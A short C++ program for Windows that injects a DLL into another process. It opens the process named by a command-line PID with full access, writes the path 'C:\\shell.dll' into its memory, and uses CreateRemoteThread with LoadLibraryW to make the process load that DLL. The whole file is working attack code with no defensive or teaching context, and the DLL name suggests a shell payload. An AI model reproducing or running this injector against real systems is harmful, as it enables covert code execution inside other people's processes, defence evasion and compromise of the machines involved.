#include <windows.h>
#include <cstdio>

int main(int argc, char *argv[]) {
    HANDLE processHandle;
    PVOID remoteBuffer;
    const wchar_t dllPath[] = L"C:\\shell.dll"; // Use L prefix for wide character string literal

    printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    
    // Allocate memory in the remote process
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(dllPath), MEM_COMMIT, PAGE_READWRITE);
    
    // Write the DLL path to the allocated memory
    WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof(dllPath), NULL);
    
    // Use GetModuleHandleW for wide string
    HMODULE kernel32Handle = GetModuleHandleW(L"Kernel32.dll"); // Use wide version
    PTHREAD_START_ROUTINE threatStartRoutineAddress = 
        (PTHREAD_START_ROUTINE)GetProcAddress(kernel32Handle, "LoadLibraryW");
    
    // Create remote thread to load the DLL
    CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
    
    // Close the handle to the process
    CloseHandle(processHandle);
    
    return 0;
}
